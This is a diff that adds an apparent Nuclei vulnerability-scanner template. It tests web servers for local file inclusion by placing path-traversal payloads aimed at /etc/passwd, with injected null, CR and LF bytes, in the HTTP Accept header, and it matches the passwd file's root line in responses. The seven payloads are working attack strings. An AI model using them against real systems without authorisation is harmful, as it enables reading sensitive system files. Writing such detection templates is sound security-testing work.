@@ -1,0 +1,31 @@
+id: accept-header-lfi
+
+info:
+  name: Accept Header - lfi
+  author: omkar7505
+  severity: high
+  tags: misconfig,lfi
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Accept: {{payload}}
+
+    payloads:
+      payload:
+        - "../../../../../../../../../../etc/passwd{{"
+        - "../../../../../../../../../../etc/passwd{%0D"
+        - "../../../../../../../../../../etc/passwd{%0A"
+        - "../../../../../../../../../../etc/passwd{%00"
+        - "../../../../../../../../../../etc/passwd{%0D{{"
+        - "../../../../../../../../../../etc/passwd{%0A{{"
+        - "../../../../../../../../../../etc/passwd{%00{{"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+        part: body
